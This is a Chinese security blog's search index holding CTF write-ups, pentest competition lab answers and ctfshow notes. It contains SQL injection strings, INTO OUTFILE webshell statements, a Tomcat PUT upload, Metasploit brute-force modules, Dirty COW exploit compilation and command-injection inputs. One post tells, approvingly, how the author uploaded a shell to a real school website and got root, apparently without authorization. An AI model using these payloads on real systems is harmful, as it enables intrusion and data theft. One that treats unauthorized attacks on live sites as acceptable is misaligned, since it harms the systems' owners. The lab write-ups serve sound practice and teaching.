<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>比赛poc</title>
      <link href="/2022/05/30/bi-sai-poc/"/>
      <url>/2022/05/30/bi-sai-poc/</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>robots.txt协议</p><p><img src="web1.png"></p><p><img src="web1-1.png"></p><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>简单sql注入</p><p>先查看有几个字段</p><p>1’ order by 4#</p><p><img src="web2.png"></p><p>联合查询，查数据库</p><p>?id=-1’ union select 1,2,3,database()#</p><p><img src="web2-1.png"></p><p>联合查询数据库的表</p><p>id=-1’ union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()#</p><p><img src="web2-2.png"></p><p>查数据库中表的字段</p><p>id=-1’ union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=’fl4g’#</p><p><img src="web2-3.png"></p><p>查询skctf_flag中的数据</p><p>id=-1’ union select 1,2,3,skctf_flag from fl4g#</p><p><img src="web2-4.png"></p><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>查看源代码发现只能上传图片</p><p><img src="web3.png"></p><p>上传图片发现文件上传成功！filename：1.jpg<br>但要给我一个give_me_flag.php 我才给你flag!</p><p><img src="web3-1.png"></p><p>bp抓包重放，send之后发现</p><p><img src="web3-2.png"></p><p>我们在数据里面的最下面加入givemeflag</p><p><img src="web3-3.png"></p><p>scend之后得到flag</p><p><img src="web3-4.png"></p><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><pre><code>if(!isset($_GET['flag']) &amp;&amp; !isset($_POST['flag'])){    exit($msg_giveme);}</code></pre><p>上面代码说明，不管是POST还是GER，必须带有’flag’参数。通过这里往下看</p><pre><code>foreach ($_POST as $key =&gt; $value) {    $$key = $value;</code></pre><p>上面的源码这里可以变量覆盖</p><p>比如说传入<code>flag=cc</code>,则<code>$flag=$cc</code></p><p>虽然传入flag参数后flag会被覆盖，但可以用别的变量保存flag。</p><p>传入<code>a=flag&amp;flag=a</code>则<code>$a=$flag,$flag=$a</code></p><p><code>payload：?a=flag&amp;flag=a</code></p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="misc1"><a href="#misc1" class="headerlink" title="misc1"></a>misc1</h2><p>notepad++ 或者winhex或者记事本打开</p><p>直接搜索flag</p><p><img src="misc1.png"></p><h2 id="misc2"><a href="#misc2" class="headerlink" title="misc2"></a>misc2</h2><p>解压得到两个文件        flag.zip（无法解压密码发现，里面有个文件和题目名字一样）猜测是明文攻击</p><p>先将 <code>Yahiko.png</code> zip压缩一下（必须要用<code>winrar</code>因为加密文件也是winrar压缩的）</p><p><img src="misc.png" alt="misc"></p><p>使用<code>ARCHPR</code> 工具</p><p><img src="misc5.png" alt="misc5"></p><p>点击开始之后，过了一会在点击暂停,点击确定,自动跳到保存文件</p><p><img src="misc5-1.png" alt="misc5-1"></p><p>解压进docx 文件</p><p><img src="misc5-3.png" alt="misc5-3"></p><p><img src="misc5-2.png" alt="misc5-2"></p><p>修改颜色</p><p><img src="5-2.png" alt="5-2"></p><h2 id="misc3"><a href="#misc3" class="headerlink" title="misc3"></a>misc3</h2><p>用foremost提取出一张bmp图片，</p><p><img src="misc3.png"></p><p>用stegsolve打开，Analyse选择Data Extract，勾选r,g,b的三个0通道，save bin得到flag的图片。</p><img src="misc3-1.png" style="zoom:50%;"><p>flag</p><img src="misc3-2.png" style="zoom:50%;"><h2 id="misc4"><a href="#misc4" class="headerlink" title="misc4"></a>misc4</h2><p>用winhex打开搜索ctf</p><p><img src="misc4.png"></p><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="CRYPTO1"><a href="#CRYPTO1" class="headerlink" title="CRYPTO1"></a>CRYPTO1</h2><p>下载打开发现有个txt，打开进去发现，有一串看不懂的代码</p><p>浏览器f12，复制到console中确定</p><p><img src="mima1.png"></p><h2 id="CRYPTO2"><a href="#CRYPTO2" class="headerlink" title="CRYPTO2"></a>CRYPTO2</h2><p>下载打开发现凯撒关键字猜测凯撒密码，直接在线解码</p><p><a href="http://www.hiencode.com/"></a></p><p>key输入1得到flag</p><h2 id="CRYPTO3"><a href="#CRYPTO3" class="headerlink" title="CRYPTO3"></a>CRYPTO3</h2><pre><code>Caesar bought 64 rabbits（中文意思是凯撒买了64之兔子）</code></pre><p>猜测是套娃，加密顺序可能是凯撒—&gt;base64—&gt;rabbits三种加密</p><p><a href="http://www.hiencode.com/"></a></p><p><a href="http://www.jsons.cn/rabbitencrypt/"></a></p><p>按着题目给的意思，我们要倒着去解密，显示rabbit，64只兔子可能是复数+个s，Rabbits</p><p><img src="mima2.png"></p><p>在是base64</p><p><img src="mima3.png"></p><p>在是凯撒密码遍历1</p><p><img src="mima3-1.png"></p><h1 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h1><p>ida打开文件，找到main函数f5，就能看到flag</p><p><img src="nixiang.png"></p><p>得到的像个base64，base64解密下得到flag。</p>]]></content>
      
      
      <categories>
          
          <category> -web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -web渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记学校旁站测试</title>
      <link href="/2021/12/13/ji-xue-xiao-pang-zhan-ce-shi/"/>
      <url>/2021/12/13/ji-xue-xiao-pang-zhan-ce-shi/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p> 在校无聊的时候上学校网站逛了一波波，无意间点开了一个网站。</p><p><img src="1.png"></p><p>这我匝一看，这页面，这界面感动啊。抱着尝试的心态试了一试。</p><p>头像和相册都可以文件上传成功。</p><p><img src="2.png"></p><p><code>然后bp重放了，</code></p><p><img src="3.png"></p><p><code>上传成功</code></p><p><img src="3.jpg"></p><p>还好不是跟网络教学平台那个网站一样坑，找不到上传文件的路径。</p><p>在源码里面找到了路径，直接连接一波。</p><p><img src="4.jpg"></p><p>还是个root权限，哈哈。</p>]]></content>
      
      
      <categories>
          
          <category> -web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -web渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一次某平台上面的题目解题过程</title>
      <link href="/2021/11/03/yi-ci-mou-ping-tai-shang-mian-de-ti-mu-jie-ti-guo-cheng/"/>
      <url>/2021/11/03/yi-ci-mou-ping-tai-shang-mian-de-ti-mu-jie-ti-guo-cheng/</url>
      
        <content type="html"><![CDATA[<h2 id="任务一：namp扫描测试"><a href="#任务一：namp扫描测试" class="headerlink" title="任务一：namp扫描测试"></a>任务一：namp扫描测试</h2><ul><li>1.在本地PC渗透测试平台Kali中使用nmap工具查看本地路由与接口,并将该操作使用的全部命令作为FLAG提交；</li></ul><p>​        <code>nmap --iflist 172.16.101.250</code>  </p><p><img src="1.png"></p><ul><li>2.通过本地PC中渗透测试平台Kali对服务器场景Linux进行VNC服务扫描渗透测试，并将使用的脚本名称作为FLAG提交（例mysql-brute.nse）；</li></ul><p>​        <code>nmap --script vnc-brute.nse - p 5900 172.16.101.250</code></p><p>​        <code>    vnc-info.nse</code></p><p><img src="2.png"></p><ul><li>3.通过本地PC中渗透测试平台Kali对服务器场景Linux进行VNC服务扫描渗透测试，并将该操作显示结果中VNC版本号作为FLAG提交； </li></ul><p>​        <code>nmap --script vnc-brute -A 5900 172.16.101.250</code></p><p>​        可能是 <code>nmap --script vnc-info.nse 172.16.101.250</code></p><ul><li>4.在本地PC渗透测试平台Kali中使用nmap发送空的UDP数据对类DNS服务avahi进行拒绝服务攻击，并将使用的脚本名称作为FLAG提交（例mysql-brute.nse）；</li></ul><p>​        <code>nmap -broadcast-avahi-dos.nes 172.16.101.250</code></p><ul><li>5.通过本地 PC 中渗透测试平台 Kali 对服务器场景 Linux 进行模糊测试，来发送异常的包到靶机服务器，探测出隐藏在服务器中的漏洞 ，并将使用的脚本名称作为 FLAG 提交（例 mysql-brute.nse）； </li></ul><p>​        <code>nmap --script dns-fuzz.nse 172.16.101.250</code></p><ul><li>6.在本地 PC 渗透测试平台 Kali 中使用 zenmap 工具扫描服务器场景可能存在远程任意代码执行漏洞，并将使用的脚本名称的字符串作为 FLAG 提交; （例mysql-brute.nse）； </li></ul><p>​        <code>nmap --script http-shellshock.nse 172.16.101.250</code></p><ul><li>7.在本地PC渗透测试平台Kali中使用zenmap工具扫描服务器场景可能存在远程任意代码执行漏洞（提示：检测路径为/cgi-bin/bin，需添加–script-args uri=/cgi-bin/bin参数），并将该操作显示结果中漏洞编号和发布时间作为FLAG提交（漏洞编号和发布时间的字符串之间以分号隔开）。</li></ul><p>​         <code>nmap -sV -p- --script http-shellshock --script-args uri=cgi-binbin,cmd=ls 192.168.3.0/24</code></p><h2 id="任务二、nmap扫描渗透测试2"><a href="#任务二、nmap扫描渗透测试2" class="headerlink" title="任务二、nmap扫描渗透测试2"></a>任务二、nmap扫描渗透测试2</h2><ul><li>1.通过本地PC中渗透测试平台Kali对服务器场景Linux进行Web扫描渗透测试（使用工具nikto，查看该命令的完整帮助文件），并将该操作使用命令中固定不变的字符串作为Flag提交； </li></ul><p>​        <code>nikto -H</code></p><ul><li>2.通过本地PC中渗透测试平台Kali对服务器场景Linux进行Web扫描渗透测试（使用工具nikto，扫描目标服务器8080端口，检测其开放状态），并将该操作使用命令中固定不变的字符串作为Flag提交（目标地址以<strong><a href="http://10.10.10.1/">http://10.10.10.1</a></strong>来表示）； </li></ul><p>​        <code>nikto -h http://10.10.10.1:8080</code></p><p>​        <code>nikto -h 172.16.101.250 -p 8080</code>                    </p><p>​     <img src="3.png">                               </p><ul><li>3.通过本地PC中渗透测试平台Kali对服务器场景Linux进行Web扫描渗透测试（使用工具nikto，扫描目标服务器80端口），将回显信息中apache服务的版本参数作为flag提交；</li></ul><p>​        <code>nikto -h 172.16.101.250</code></p><p>   <img src="4.png"></p><p>​        <strong>Apache/2.2.15 (CentOS)</strong></p><ul><li>4.通过本地PC中渗透测试平台Kali对服务器场景Linux进行Web扫描渗透测试（使用工具nikto，扫描目标服务器80端口），将回显信息中php的版本参数作为flag提交；</li></ul><p>​        <strong>PHP/5.3.3</strong></p><p>   <img src="5.png"></p><ul><li>5.通过本地PC中渗透测试平台Kali对服务器场景Linux进行Web扫描渗透测试（使用工具nikto，扫描cgi-bin目录的文件），将该操作使用的命令中固定不变的字符串作为Flag（目标地址以：<a href="http://10.10.10.1来表示)提交;/">http://10.10.10.1来表示）提交；</a></li></ul><p>​        <strong>目录扫描</strong></p><p>​        <code>nikto -h http://10.10.10.1 -Cgidirs /cgi-bin/</code></p><p>​         <code>nikto -Cgidirs cgi-bin -h http://172.16.101.250</code></p><ul><li>6.通过本地PC中渗透测试平台Kali对服务器场景Linux进行Web扫描渗透测试，使用工具nikto并结合nmap的扫描结果进行扫描，首先使用nmap工具对靶机所在网段的80端口进行扫描，并将扫描结果以输出至所有格式的方式输出到指定文件target中，将输出至所有格式需要用到的参数作为flag提交； </li></ul><p>​        <strong>oA</strong></p><p>​        <code>map - F -oA targer 172.16.101.250</code></p><p> <img src="6.png"></p><p>  <img src="7.png"></p><ul><li>7.通过本地PC中渗透测试平台Kali对服务器场景Linux进行Web扫描渗透测试，使用工具nikto扫描第六题生成的target文件中的网站，并将该操作使用的所有命令作为FLAG提交。</li></ul><p>​        <code>nikto -host target.gnmap</code></p><p>  <img src="8.png"></p><h2 id="任务三：SSH弱口令渗透测试"><a href="#任务三：SSH弱口令渗透测试" class="headerlink" title="任务三：SSH弱口令渗透测试"></a>任务三：SSH弱口令渗透测试</h2><ul><li>1.在本地PC渗透测试平台BT5中使用zenmap工具扫描服务器场景Linux所在网段(例如：172.16.101.0/24)范围内存活的主机IP地址和指定开放的21、22、23端口。并将该操作使用的命令中必须要添加的字符串作为FLAG提交（忽略ip地址）； </li></ul><p>​        <strong>-p 21,22,23</strong></p><p>​        <code>nmap -sS 172.16.101.0/24 -p 21,22,23</code> </p><p> <img src="9.png"></p><ul><li>2.通过本地PC中渗透测试平台BT5对服务器场景Linux进行系统服务及版本扫描渗透测试，并将该操作显示结果中SSH服务对应的服务端口信息作为FLAG提交；</li></ul><p>​        <strong>22/tcp</strong></p><p>​        <code>nmap -O 172.16.101.250</code>  </p><p> <img src="10.png"></p><ul><li>3.在本地PC渗透测试平台BT5中使用MSF模块对其爆破，使用search命令，并将扫描弱口令模块的名称信息作为FLAG提交；</li></ul><p>​         <strong>auxiliary/scanner/ssh/ssh_login</strong></p><ul><li>4.在上一题的基础上使用命令调用该模块，并查看需要配置的信息（使用show options命令），将回显中需要配置的目标地址,密码使用的猜解字典,线程,账户配置参数的字段作为FLAG提交（之间以英文逗号分隔，例hello,test，..,..）； </li></ul><p><strong>RHOSTS,PASS_FILE,THREADS,USERNAME （ip地址，密码文件的地址，线程，用户名）</strong></p><ul><li>5.在msf模块中配置目标靶机IP地址，将配置命令中的前两个单词作为FLAG提交； </li></ul><p>​    <strong>set RHOSTS</strong></p><p>​    <strong>同上</strong></p><ul><li>6.在msf模块中指定密码字典，字典路径为/root/2.txt，用户名为test爆破获取密码并将得到的密码作为FLAG提交；</li></ul><p>​         <strong>aaabc3</strong></p><ul><li>7.在上一题的基础上，使用第6题获取到的密码SSH到靶机，将test用户家目录中唯一一个后缀为.bmp图片的文件名的字符串作为FLAG提交。 </li></ul><p>​        <strong>ssh <a href="mailto:test@172.16.101.250">test@172.16.101.250</a></strong></p><p>​        <code>nauiwrevy</code></p><p><img src="11.png"></p><h2 id="任务四：FTP弱口令渗透测试"><a href="#任务四：FTP弱口令渗透测试" class="headerlink" title="任务四：FTP弱口令渗透测试"></a>任务四：FTP弱口令渗透测试</h2><p>1.在本地PC渗透测试平台BT5中使用zenmap工具扫描服务器场景Windows所在网段(例如：172.16.101.0/24)范围内存活的主机IP地址和指定开放的21、22、23端口。并将该操作使用的命令中必须要添加的字符串作为FLAG提交（忽略ip地址）； </p><p><strong>-p 21,22,23</strong></p><p>2.通过本地PC中渗透测试平台BT5对服务器场景Windows进行系统服务及版本扫描渗透测试，并将该操作显示结果中FTP服务对应的服务端口信息作为FLAG提交；</p><p><strong>21/tcp</strong></p><p>3.在本地PC渗透测试平台BT5中使用MSF中模块对其爆破，使用search命令，并将扫描弱口令模块的名称信息作为FLAG提交； </p><p><strong>auxiliary/scanner/ftp/ftp_login</strong></p><p>4.在上一题的基础上使用命令调用该模块，并查看需要配置的信息（使用show options命令），将回显中需要配置的目标地址,密码使用的猜解字典,线程,账户配置参数的字段作为FLAG提交（之间以英文逗号分隔，例hello,test，..,..）； </p><p><strong>RHOSTS,PASS_FILE,THREADS,USERNAME</strong></p><p>5.在msf模块中配置目标靶机IP地址，将配置命令中的前两个单词作为FLAG提交； </p><p><strong>set RHOSTS</strong></p><p>6.在msf模块中指定密码字典，字典路径为/root/2.txt,用户名为test爆破获取密码并将得到的密码作为FLAG提交；</p><p><strong>133c31</strong></p><p>7.在上一题的基础上，使用第6题获取到的密码登陆ftp服务，将该目录中flag2.bmp的图片文件中的英文单词作为FLAG提交。</p><p><strong>sdfpsmdv</strong></p><h2 id="任务五：数据分析数字取证logs"><a href="#任务五：数据分析数字取证logs" class="headerlink" title="任务五：数据分析数字取证logs"></a>任务五：数据分析数字取证logs</h2><ol><li>使用Wireshark查看并分析Windows 7桌面下的logs.pcapng数据包文件，通过分析数据包logs.pcapng找出恶意用户目录扫描的第9个文件，并将该文件名作为FLAG（形式：[robots.txt]）提交：</li></ol><p><strong>[star.php]</strong></p><p><img src="12.png"></p><ol start="2"><li>继续查看数据包文件logs.pcapng，分析出恶意用户扫描了哪些端口，并将全部的端口作为FLAG（形式：[端口名1，端口名2，端口名3…，端口名n]）从低到高提交：</li></ol><p><strong>[21,80,445,1433,3306,3389,5000]</strong></p><p><img src="13.png"></p><ol start="3"><li>继续查看数据包文件logs.pcapng分析出恶意用户读取服务器的文件名是什么，并将该文件名作为FLAG（形式：[robots.txt]）提交：</li></ol><p>​        <strong>[name.txt]</strong></p><p>​        <strong>注意读取文件大概分为两种</strong></p><p>​        <strong>1.木马读取</strong></p><p>​        <strong>1.1通过木马读取文件可以搜索木马上传成功之后的操作</strong></p><p>​        <strong>2.MySQL读取</strong></p><p>​        <strong>2.1MySQL读取文件可以通过搜索load_file函数查找</strong></p><p><img src="14.png"></p><ol start="4"><li>继续查看数据包文件logs.pcapng分析出恶意用户写入一句话木马的路径是什么，并将该路径作为FLAG（形式：[/root/whoami/]）提交：</li></ol><p>​        <strong>[C:/phpstudy/www/]</strong></p><p> <img src="15.png"></p><ol start="5"><li>继续查看数据包文件logs.pcapng分析出恶意用户连接一句话木马的密码是什么，并将一句话密码作为FLAG（形式：[一句话密码]）提交：</li></ol><p>  <img src="16.png"></p><p>​        <strong>[007]</strong></p><ol start="6"><li>继续查看数据包文件logs.pcapng分析出恶意用户下载了什么文件，并将文件名及后缀作为FLAG（形式：[文件名.后缀名]）提交：</li></ol><p>​        <strong>[flag.zip]</strong></p><p> <img src="17.png"></p><ol start="7"><li>继续查看数据包文件logs.pcapng将恶意用户下载的文件里面的内容作为FLAG（形式：[文件内容]）提交：</li></ol><p>​    <strong>[flag{Find You!}]</strong></p><h2 id="任务六-：数据分析数字取证-Bravo-1"><a href="#任务六-：数据分析数字取证-Bravo-1" class="headerlink" title="任务六 ：数据分析数字取证-Bravo-1"></a>任务六 ：数据分析数字取证-Bravo-1</h2><ol><li>分析Windows 7桌面下的Bravo-1.pcapng数据包文件，通过分析数据包Bravo-1.pcapng找出恶意用户目录扫描的第2个目录名，并将该目录名作为FLAG提交：</li></ol><p>​        <strong>uploads</strong></p><p>​    <img src="18.png"></p><ol start="2"><li>继续查看数据包文件Bravo-1.pcapng，分析出恶意用户通过哪个目录写入的一句话木马，并将该目录名作为FLAG提交：</li></ol><p>​        <strong>phpmyadmin</strong></p><p>   <img src="19.png"></p><ol start="3"><li>继续查看数据包文件Bravo-1.pcapng分析出恶意用户读取了服务器什么文件，并将该文件名及后缀作为FLAG提交：</li></ol><p>​        <strong>flag.txt</strong></p><ol start="4"><li>继续查看数据包文件Bravo-1.pcapng分析出恶意用户写入一句话木马的路径是什么，并将该路径作为FLAG提交：</li></ol><p>​        <strong>c:/phpstudy/www/m/shell.php</strong></p><ol start="5"><li>继续查看数据包文件Bravo-1.pcapng分析出恶意用户连接一句话木马的密码是什么，并将一句话密码作为FLAG提交：</li></ol><p>​        <strong>cia</strong></p><ol start="6"><li>继续查看数据包文件Bravo-1.pcapng分析出恶意用户下载了什么文件，并将文件名及后缀作为FLAG提交：</li></ol><p>​        <strong>connect.php</strong></p><ol start="7"><li>继续查看数据包文件Bravo-1.pcapng将Web服务器连接的数据库名作为FLAG提交：</li></ol><p>​        <strong>kingsman</strong></p><h2 id="任务七：tomcat中间件安全与加固"><a href="#任务七：tomcat中间件安全与加固" class="headerlink" title="任务七：tomcat中间件安全与加固"></a>任务七：tomcat中间件安全与加固</h2><ol><li>通过渗透机场景kali中的工具对web服务器进行扫描，浏览web服务器网页，在首页中找到tomcat服务版本号，并将其版本号作为flag提交；</li></ol><p>​        <strong>7.0.79</strong></p><p>​    <img src="20.png"></p><ol start="2"><li>已知此版本的tomcat具有上传漏洞，即向页面提交发送请求就会生成对应的文件。利用Burp Suite工具进行抓包，向网站首页位置提交内容为&lt;%out.print(“hello”);%&gt;文件名字为good.jsp的请求。将Burp Suite中的PUT请求作为flag提交（注：flag长度为16个单位长度）；</li></ol><p>​        <strong>PUT /good.jsp%20</strong></p><p>   <img src="21.png"></p><ol start="3"><li>通过msfconsole工具使用root目录下的的password.txt文件进行tomcat后台账户密码的破解，并将账户密码作为flag提交。（flag格式：账户_密码）；</li></ol><p>​        <a href="http://172.16.101.247:8080/manager">http://172.16.101.247:8080/manager</a></p><p>​        <strong>root_admin</strong></p><p>​        <strong>root_zxcvbnm</strong></p><p>​        <strong>search tomcat   tomcat_login  Tomcat_mgr_login</strong></p><p>​        <strong>set rhosts ip</strong></p><p>​        <strong>set rport 44444</strong></p><p>​        <strong>set threads 5</strong> </p><ol start="4"><li>用kali中的分离工具查看root目录下bm1.war文件中的flag文件，并将flag文件内容作为提交；</li></ol><p>​        <strong>sdfgghjkl</strong></p><ol start="5"><li>通过第3题中的账户密码登陆网页（格式为服务器IP：8080/manager/html），将kali中root目录下的bm1.war文件上传后连接（连接地址为IP：8080/bm1/index.jsp）。在服务器中查找flag.txt文件，并将其内容作为flag提交；</li></ol><p>​        <strong>wasdsaw</strong></p><p><img src="22.png"></p><ol start="6"><li>修改tomcat配置文件内容，使tomcat可以抵御第2题中的漏洞，将修改内容作为flag提交；</li></ol><p>​        <strong>TRUE</strong></p><h2 id="任务八：mysql安全测试"><a href="#任务八：mysql安全测试" class="headerlink" title="任务八：mysql安全测试"></a>任务八：mysql安全测试</h2><p>​        <strong>172.16.101.249:8081</strong></p><ol><li>利用渗透机kali中的工具确定mysql的端口，将mysql端口作为flag提交；</li></ol><p>​        <strong>3358</strong></p><ol start="2"><li>管理者曾在web界面登陆数据库，并执行了select ‘';system($_GET['cmd']); echo ''; ?&gt;’ INTO OUTFILE ‘C:/phpstudy/WWW/test1.php’语句，结合本执行语句使用dos命令查看服务器的详细配置信息，并将服务器的系统型号作为flag提交；</li></ol><p>​        <strong>Bochs</strong></p><p>​        <strong>select ‘’</strong></p><p>​        <strong>select ‘’ into outfile’C:/phpstudy/WWW/tes1.php’</strong></p><ol start="3"><li>利用渗透机kali中的msf工具使用root目录下password.txt字典文件破解MySQL的密码，并将破解mysql的密码所需的模块当作flag提交(账户为root);</li></ol><p>​        <strong>mysql_login</strong></p><ol start="4"><li>利用渗透机kali中的msf工具使用root目录下password.txt字典文件破解MySQL的密码，并将mysql的密码当作flag提交(账户为root);</li></ol><p>​        <strong>zxcvbnm</strong></p><ol start="5"><li>利用上题中的数据库账户密码在web界面登陆数据库，通过select ‘’************ ‘C:/phpstudy/WWW/shell.php’语句向服务器提交名为shell.php的一句话木马，将语句中<em>号的明文作为flag提交（</em>为大写字母或者空格）；</li></ol><p>​        <strong>INTO OUTFILE</strong>  </p><ol start="6"><li>使用菜刀连接上题中的shell.php,下载服务器根目录下的压缩包，将压缩包中的flag提交</li></ol><p>​        <strong>huaixiaohai</strong></p><h2 id="任务九：利用python脚本进行web渗透测试"><a href="#任务九：利用python脚本进行web渗透测试" class="headerlink" title="任务九：利用python脚本进行web渗透测试"></a>任务九：利用python脚本进行web渗透测试</h2><ol><li>使用渗透机场景kali中工具扫描确定Web服务器场景地址，浏览网站flag.html页面，并将flag.html中的flag提交；</li></ol><p>​        <strong>WXL0601</strong></p><ol start="2"><li>进入渗透机场景win7操作系统，完善桌面上的tupian.py文件，填写该文件当中空缺的FLAG1字符串，并将改字符串作为flag提交；</li></ol><p>​        <strong>re</strong></p><ol start="3"><li>进入渗透机场景win7操作系统，完善桌面上的tupian.py文件，填写该文件当中空缺的FLAG2字符串，并将改字符串作为flag提交；</li></ol><p>​        <strong>url</strong></p><ol start="4"><li>进入渗透机场景win7操作系统，完善桌面上的tupian.py文件，填写该文件当中空缺的FLAG3字符串，并将改字符串作为flag提交；</li></ol><p>​        <strong>src</strong></p><ol start="5"><li>进入渗透机场景win7操作系统,完善桌面上的tupian.py文件，填写该文件当中空缺的FLAG字符串并运行成功文件会自动爬取网站tupian.php的图片，将爬取的图片数量作为flag提交；</li></ol><p>​        <strong>29</strong></p><ol start="6"><li>结合网站的引导信息，参考源码再次将tupian.py进行修改，使tupian.py只爬取flag图片。再次运行tupian.py,并将修改的字符与爬取到的图片中的内容做为flag提交（提交格式为：修改的字符_图片内容）；</li></ol><p>​        <strong>BEIJINGANDBISAI</strong></p><h2 id="任务十：Linux操作系统渗透测试"><a href="#任务十：Linux操作系统渗透测试" class="headerlink" title="任务十：Linux操作系统渗透测试"></a>任务十：Linux操作系统渗透测试</h2><ol><li><p>通过本地PC中渗透测试平台Kali对服务器场景Linux进行操作系统扫描渗透测试，并将该操作显示结果“OS Details：”之后的字符串作为FLAG提交；</p><pre><code>  `nmap -O 172.16.101.250`</code></pre></li></ol><p><img src="23.png"></p><ol start="2"><li>通过本地PC中渗透测试平台Kali对服务器场景Linux进行系统服务及版本扫描渗透测试，并将该操作显示结果中MySQL数据库对应的服务版本信息字符串作为FLAG提交；</li></ol><p>​        <code>nmap -A 172.16.101.250</code></p><p>   <img src="24.png"></p><ol start="3"><li><strong>通过本地PC中渗透测试平台Kali对服务器场景Linux进行渗透测试，将该场景/var/www/html目录中唯一一个后缀为.html文件的文件名称作为FLAG提交；</strong></li></ol><p>​        <strong>1、先爆破数据库密码，用九头蛇或者是msf</strong></p><p>​        <strong>2、拿到密码插入一句话木马 <code>select "" into outfile "/var/www/html/shell.php";</code></strong></p><p>​        <strong>3、蚁剑连接就能看见</strong></p><p>​        <a href="http://172.16.101.250/shell.php">http://172.16.101.250/shell.php</a></p><p>  <img src="25.png"></p><ol start="4"><li>通过本地PC中渗透测试平台Kali对服务器场景Linux进行渗透测试，将该场景/var/www/html目录中唯一一个后缀为.html文件的文件内容作为FLAG提交；</li></ol><p><img src="26.png"></p><ol start="5"><li>通过本地PC中渗透测试平台Kali对服务器场景Linux进行渗透测试，将该场景/root目录中唯一一个后缀为.bmp文件的文件名称作为FLAG提交； </li></ol><p><img src="27.png"></p><ol start="6"><li>通过本地PC中渗透测试平台Kali对服务器场景Linux进行渗透测试，将该场景/root目录中唯一一个后缀为.bmp的图片文件中的英文单词作为FLAG提交。</li></ol><p><img src="28.png"></p><p>​        <strong>第二种方法，提权</strong></p><p>​        <strong>1、爆破出test密码，</strong></p><p>​        <strong>2、查看版本型号发现是2.6.32</strong></p><p>​    <img src="29.png"></p><p>​        <strong>3、在kali中查找exp</strong></p><p>​        <code>searchsploit COW | grep 2.6</code></p><p>​        <code>40839.c</code></p><p>​    <img src="30.png"></p><p>​        <strong>补全目录</strong></p><p>​        <code>locate linux/local/40839.c</code></p><p>​        <code>uname -a</code></p><p>​        <strong>4、gcc编译</strong></p><p>​        <code>gcc -pthread exp.c -o exp -lcrypt</code></p><p>​        <code>ls</code></p><p>​        <code>./exp</code></p><p>​        <strong>设置密码</strong></p><p>​        <strong>新账号firefart  密码：</strong></p><h2 id="任务十一：Windows操作系统渗透测试"><a href="#任务十一：Windows操作系统渗透测试" class="headerlink" title="任务十一：Windows操作系统渗透测试"></a>任务十一：Windows操作系统渗透测试</h2><ol><li>通过本地PC中渗透测试平台Kali对服务器场景Windows进行操作系统扫描渗透测试，并将该操作显示结果“Running：”之后的字符串作为FLAG提交； </li></ol><p>​        <strong>Microsoft Windows XP|2003</strong></p><ol start="2"><li>通过本地PC中渗透测试平台Kali对服务器场景Windows进行系统服务及版本扫描渗透测试，并将该操作显示结果中445端口对应的服务版本信息字符串作为FLAG提交；</li></ol><p>​        <strong>microsoft-ds</strong></p><ol start="3"><li>通过本地PC中渗透测试平台Kali对服务器场景Windows进行渗透测试，将该场景网络连接信息中的DNS信息作为FLAG提交;(例如114.114.114.114)；</li></ol><p>​        <strong>202.103.24.68</strong></p><ol start="4"><li>通过本地PC中渗透测试平台Kali对服务器场景Windows进行渗透测试，将该场景桌面上111文件夹中唯一一个后缀为.docx文件的文件名称作为FLAG提交； </li></ol><p>​        <strong>gbyuikvc</strong></p><ol start="5"><li>通过本地PC中渗透测试平台Kali对服务器场景Windows进行渗透测试，将该场景桌面上111文件夹中唯一一个后缀为.docx文件的文档内容作为FLAG提交；</li></ol><p>​        <strong>serbvuik</strong></p><ol start="6"><li>通过本地PC中渗透测试平台Kali对服务器场景Windows进行渗透测试，将该场景桌面上222文件夹中唯一一个图片中的英文单词作为FLAG提交</li></ol><p>​        <strong>presistence</strong></p>]]></content>
      
      
      <categories>
          
          <category> -web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -web渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow刷题记录</title>
      <link href="/2021/10/20/ctfshow-shua-ti-ji-lu/"/>
      <url>/2021/10/20/ctfshow-shua-ti-ji-lu/</url>
      
        <content type="html"><![CDATA[<h1 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h1><h2 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h2><p> <img src="1.png"></p><p>通过抓包发现basic  猜测是base64，解密后得到 admin:admin</p><p>​    <img src="2.png"></p><p>对于admin:admin抓包，我们设置1的时候把admin:圈上了，所以后面，这里要加一个:</p><p>​    <img src="3.png"></p><p>顺序也不能乱，先设置 add Suffix: 在设置加密</p><p>​    <img src="4.png"></p><p>查看回显包。</p><p>​    <img src="5.png"></p><h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a><strong>web29</strong></h2><p>​    <img src="6.png"></p><ol><li><strong>get  c，如果不为flag，去执行c，PHP代码执行c。这个题过滤掉了flag字符。</strong></li><li><strong>?c=phpinfo();     或者 ?c=phpinfo()?&gt;     ?c=system(‘ls’);</strong>   </li><li><strong>c=file_get_contents(“)    ?c=system(“cp flag.php 1.txt”);  ?c=system(“cp fla?.php 1.txt”);</strong>    </li><li><strong>换成？为什么换成? 因为在shell里面 ？站一个占位符，和正则有点相似，*代表多个，？代表一个。</strong></li><li><strong>/1.txt</strong></li></ol><h2 id="web30"><a href="#web30" class="headerlink" title="web30"></a><strong>web30</strong></h2><pre><code> &lt;?php/*# -*- coding: utf-8 -*-# @Author: 